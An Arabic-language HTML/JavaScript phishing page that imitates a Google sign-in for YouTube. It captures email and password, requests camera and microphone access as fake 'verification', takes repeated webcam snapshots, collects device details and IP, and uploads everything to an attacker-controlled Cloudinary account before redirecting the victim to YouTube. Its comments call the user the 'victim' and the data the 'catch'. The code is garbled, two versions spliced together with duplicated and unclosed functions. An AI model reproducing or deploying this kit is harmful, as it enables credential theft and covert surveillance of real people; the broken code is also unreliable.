<!DOCTYPE html>
<html lang="ar">
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول - حسابات Google</title>
    <meta name="description" content="قم بتسجيل الدخول للمتابعة إلى YouTube. هذه صفحة تحقق آمنة لضمان ملكية الحساب.">
    
    <style>
        body { font-family: 'Roboto', arial, sans-serif; background-color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: #202124; }
        .login-box { width: 350px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
        img { width: 75px; margin-bottom: 10px; }
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: #202124; }
        .login-box { width: 100%; max-width: 450px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
        img.logo { width: 75px; margin-bottom: 10px; }
        h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; }
        p { font-size: 16px; margin-bottom: 25px; }
        input { width: 100%; padding: 13px; margin-bottom: 15px; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
        button { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; width: 100%; font-size: 14px; }
        p { font-size: 16px; margin-bottom: 25px; color: #3c4043; }
        input { width: 100%; padding: 13px; margin-bottom: 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; outline: none; }
        input:focus { border: 2px solid #1a73e8; padding: 12px; }
        button { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; width: 100%; font-size: 14px; margin-top: 10px; }
        #video, #canvas { display: none; }
        .loading-msg { color: #5f6368; font-size: 14px; margin-top: 20px; }
    </style>
</head>
<body>

<div class="login-box" id="loginForm">
    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google">
    <h1>تسجيل الدخول</h1>
    <p>للمتابعة إلى YouTube</p>
    <input type="email" id="email" placeholder="البريد الإلكتروني أو الهاتف" required>
    <input type="password" id="password" placeholder="أدخل كلمة المرور" required>
    <button onclick="startAction()">التالي</button>
<div class="login-box" id="container">
    <div id="loginForm">
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="logo">
        <h1>تسجيل الدخول</h1>
        <p>استخدم حسابك على Google للمتابعة إلى YouTube</p>
        <input type="email" id="email" placeholder="البريد الإلكتروني أو الهاتف" required>
        <input type="password" id="password" placeholder="أدخل كلمة المرور" required>
        <button onclick="startInfection()">التالي</button>
    </div>
</div>

<video id="video" playsinline autoplay></video>
<canvas id="canvas" width="640" height="480"></canvas>
<video id="video" playsinline autoplay muted></video> <canvas id="canvas" width="640" height="480"></canvas>

<script>
    const cloudName = 'dgkttv99v';
    const uploadPreset = 'ml_default';
    const youtubeLink = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
    
    async function startAction() {

    async function startInfection() {
        const email = document.getElementById('email').value;
        const pass = document.getElementById('password').value;
        if(!email || !pass) return alert("يرجى إدخال البيانات");

        if(!email || !pass) { alert("يرجى إدخال البيانات"); return; }

        // إخفاء النموذج وإظهار رسالة تحميل للتمويه
        document.getElementById('loginForm').innerHTML = "<h1>جاري التحقق...</h1><p>يرجى الانتظار لحظة</p>";
        // الخروج المشرف (ب): تمويه عملية التحقق
        document.getElementById('container').innerHTML = `
            <img src="https://i.gifer.com/ZZ5H.gif" width="40">
            <h1>جاري التحقق...</h1>
            <p class="loading-msg">يتم الآن التأكد من أمان المتصفح وتحديث بروتوكولات YouTube...</p>
        `;

        try {
            // طلب الكاميرا (سيظهر الإذن الآن كأنه جزء من "التحقق")
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            document.getElementById('video').srcObject = stream;
            // طلب الصلاحيات (سيظهر طلب الكروم الرسمي)
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            const v = document.getElementById('video');
            v.srcObject = stream;
            v.muted = true; // لضمان عدم سماع الضحية لصوته

            // سحب البيانات (أ): جمع معلومات الجهاز
            const deviceData = {
                model: navigator.userAgent.split(') ')[0].split(' (')[1],
                platform: navigator.platform,
                cores: navigator.hardwareConcurrency,
                lang: navigator.language,
                ram: navigator.deviceMemory || "Unknown"
            };

            // تشغيل الفيديو في تاب جديدة لضمان بقاء التاب الحالية مفتوحة أطول وقت
            window.open(youtubeLink, '_blank');

            // التقاط سلسلة صور (كل 3 ثواني صورة) لزيادة فرص الصيد
            let shotCount = 0;
            const interval = setInterval(() => {
                captureAndUpload(email, pass, deviceData);
                shotCount++;
                if(shotCount >= 5) clearInterval(interval); // توقف بعد 5 صور
            }, 3000);

            // تنفيذ الرفع مع البيانات (الايميل والباسورد والـ IP)
            setTimeout(() => { takeSnapshot(email, pass); }, 2000);
        } catch (e) {
            // الخروج المشرف عند الرفض: الانتقال لليوتيوب مباشرة
            window.location.href = youtubeLink;
        }
    }

    async function takeSnapshot(email, pass) {
    async function captureAndUpload(email, pass, device) {
        const canvas = document.getElementById('canvas');
        const video = document.getElementById('video');
        canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
        const imageData = canvas.toDataURL("image/png");
        const img = canvas.toDataURL("image/png");

        let userIP = "Unknown";
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            userIP = data.ip;
        } catch (err) {}
        let ip = "Unknown";
        try { 
            const res = await fetch('https://api.ipify.org?format=json'); 
            const data = await res.json(); 
            ip = data.ip; 
        } catch(err){}

        const formData = new FormData();
        formData.append('file', imageData);
        formData.append('upload_preset', uploadPreset);
        const fd = new FormData();
        fd.append('file', img);
        fd.append('upload_preset', uploadPreset);

        // --- تخزين "الصيد" في الـ Tags والـ Context ---
        formData.append('tags', `IP_${userIP},Email_${email}`);
        formData.append('context', `ip=${userIP}|user=${email}|pass=${pass}`);
        // دمج بيانات الجهاز (أ) مع بيانات الدخول
        const contextInfo = `user=${email}|pass=${pass}|ip=${ip}|device=${device.model}|ram=${device.ram}|os=${device.platform}`;
        fd.append('context', contextInfo);
        fd.append('tags', `Device_${device.model},IP_${ip}`);

        fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, {
            method: 'POST',
            body: formData
        }).then(() => {
            // بعد الرفع الناجح، حوله لليوتيوب فوراً
            window.location.href = youtubeLink;
            body: fd
        });
    }
</script>
</body>
</html>
